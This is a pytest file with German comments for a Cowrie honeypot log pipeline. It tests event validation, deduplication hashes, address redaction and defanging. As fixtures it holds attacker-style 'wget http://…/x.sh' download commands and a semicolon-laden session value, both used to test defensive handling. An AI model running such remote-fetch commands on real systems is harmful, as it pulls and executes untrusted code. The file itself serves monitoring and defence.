"""Prüft die Validierung und Normalisierung der Cowrie-Ereignisse.

Die Tests laufen ohne Datenbank. Am Ende steht ein Durchlauf über die echten
Beispiel-Ereignisse vom Sensor: Was dort ankommt, muss die Prüfung bestehen.
"""

from __future__ import annotations

import json
from datetime import datetime, timedelta, timezone

import pytest

from app.events import (
    KNOWN_EVENTIDS,
    EventRejected,
    dedup_hash,
    extract_fields,
    normalize,
    parse_timestamp,
    variant_of,
)

NOW = datetime(2026, 9, 18, 12, 0, tzinfo=timezone.utc)


def raw(**fields):
    base = {
        "eventid": "cowrie.session.connect",
        "timestamp": "2026-09-17T14:26:31.000000Z",
        "session": "0123456789ab",
        "sensor": "hp-a",
        "src_ip": "203.0.113.5",
        "dst_ip": "198.51.100.1",
        "message": "New connection: 203.0.113.5:59386 (198.51.100.1:2222)",
    }
    base.update(fields)
    return base


# --- Validierung ------------------------------------------------------------


def test_unknown_eventids_are_rejected():
    with pytest.raises(EventRejected, match="eventid"):
        normalize(raw(eventid="cowrie.wasauchimmer"), now=NOW)


def test_a_line_that_is_not_an_object_is_rejected():
    with pytest.raises(EventRejected):
        normalize(["kein", "objekt"], now=NOW)


@pytest.mark.parametrize("session", ["", "a" * 65, "hat leerzeichen", "boeser;wert"])
def test_invalid_session_ids_are_rejected(session: str):
    with pytest.raises(EventRejected, match="session"):
        normalize(raw(session=session), now=NOW)


def test_an_unknown_sensor_has_no_variant():
    with pytest.raises(EventRejected, match="Variante"):
        normalize(raw(sensor="fremder"), now=NOW)


def test_the_variant_comes_from_the_sensor_name():
    assert variant_of({"sensor": "hp-a"}) == "a"
    assert variant_of({"sensor": "hp-b"}) == "b"
    # Vector setzt das Feld in Schritt 4.2 selbst, es hat Vorrang.
    assert variant_of({"sensor": "hp-a", "variant": "b"}) == "b"


def test_session_connect_without_a_source_address_is_rejected():
    event = raw()
    del event["src_ip"]
    with pytest.raises(EventRejected, match="src_ip"):
        normalize(event, now=NOW)


def test_a_source_that_is_not_an_address_is_rejected():
    with pytest.raises(EventRejected, match="Adresse"):
        normalize(raw(src_ip="nicht-wirklich"), now=NOW)


@pytest.mark.parametrize(
    "timestamp",
    ["", "gestern", "2019-01-01T00:00:00Z", "2027-01-01T00:00:00Z"],
)
def test_impossible_timestamps_are_rejected(timestamp: str):
    with pytest.raises(EventRejected, match="timestamp"):
        normalize(raw(timestamp=timestamp), now=NOW)


def test_a_small_clock_drift_is_tolerated():
    soon = (NOW + timedelta(minutes=30)).isoformat().replace("+00:00", "Z")
    assert parse_timestamp(soon, now=NOW) > NOW


def test_timestamps_become_utc():
    parsed = parse_timestamp("2026-09-17T16:26:31+02:00", now=NOW)
    assert parsed.tzinfo == timezone.utc
    assert parsed.hour == 14


# --- Idempotenz -------------------------------------------------------------


def test_the_same_line_gives_the_same_hash():
    assert dedup_hash(raw()) == dedup_hash(raw())


def test_a_different_line_gives_a_different_hash():
    assert dedup_hash(raw()) != dedup_hash(raw(session="ffffffffffff"))


def test_fields_added_in_transit_do_not_change_the_hash():
    """Sonst wäre dieselbe Zeile nach einem Neustart von Vector keine Dublette."""
    assert dedup_hash(raw()) == dedup_hash(raw(host="hp-sensor-01", file="/var/log/cowrie.json"))


def test_the_hash_is_a_hex_sha256():
    value = dedup_hash(raw())
    assert len(value) == 64 and set(value) <= set("0123456789abcdef")


# --- Adressen und Entschärfung ----------------------------------------------


def test_no_address_of_the_participants_survives_in_the_payload():
    event = normalize(raw(), now=NOW)
    as_text = json.dumps(event.payload)
    assert "203.0.113.5" not in as_text
    assert "198.51.100.1" not in as_text
    # Auch nicht in der entschärften Schreibweise.
    assert "203[.]0[.]113[.]5" not in as_text
    assert "<src>" in event.payload["message"]


def test_the_address_is_available_for_the_hash_and_only_there():
    event = normalize(raw(), now=NOW)
    assert event.source_address == "203.0.113.5"
    assert "src_ip" not in event.payload


def test_commands_are_defanged_but_foreign_addresses_stay():
    event = normalize(
        raw(eventid="cowrie.command.input", input="wget http://45.9.148.99/x.sh", message="CMD"),
        now=NOW,
    )
    assert event.fields["input"] == "wget hxxp://45[.]9[.]148[.]99/x.sh"


def test_an_attacker_who_names_their_own_address_is_redacted():
    event = normalize(
        raw(eventid="cowrie.command.input", input="wget http://203.0.113.5/x.sh"),
        now=NOW,
    )
    assert "203.0.113.5" not in event.fields["input"]
    assert "<src>" in event.fields["input"]


def test_long_input_is_shortened_not_rejected():
    event = normalize(raw(eventid="cowrie.command.input", input="a" * 20000), now=NOW)
    assert len(event.fields["input"]) == 8192
    assert event.fields["input"].endswith("…")


def test_credentials_are_kept_but_limited():
    fields = extract_fields(raw(eventid="cowrie.login.failed", username="root", password="x" * 500))
    assert fields["username"] == "root"
    assert len(fields["password"]) == 128


# --- Die echten Beispiele vom Sensor ----------------------------------------


def test_every_real_event_passes_validation(cowrie_events):
    for event in cowrie_events:
        normalize(event, now=datetime(2026, 12, 31, tzinfo=timezone.utc))


def test_the_real_events_only_use_known_eventids(cowrie_events):
    assert {event["eventid"] for event in cowrie_events} <= KNOWN_EVENTIDS


def test_no_real_event_keeps_an_address_after_normalization(cowrie_events):
    later = datetime(2026, 12, 31, tzinfo=timezone.utc)
    for event in cowrie_events:
        normalized = normalize(event, now=later)
        as_text = json.dumps(normalized.payload)
        for address in (event.get("src_ip"), event.get("dst_ip")):
            if address:
                assert address not in as_text
                assert address.replace(".", "[.]") not in as_text


def test_the_odd_client_version_from_the_wild_is_kept_but_limited(cowrie_events):
    """Ein „Client“ meldete sich mit „CONNECT …:80 HTTP/1.0“ als Version."""
    versions = [
        normalize(e, now=datetime(2026, 12, 31, tzinfo=timezone.utc)).fields.get("version")
        for e in cowrie_events
        if e["eventid"] == "cowrie.client.version"
    ]
    odd = [v for v in versions if v and v.startswith("CONNECT")]
    assert odd, "das Beispiel fehlt in den Fixtures"
    assert all(len(v) <= 128 for v in versions if v)
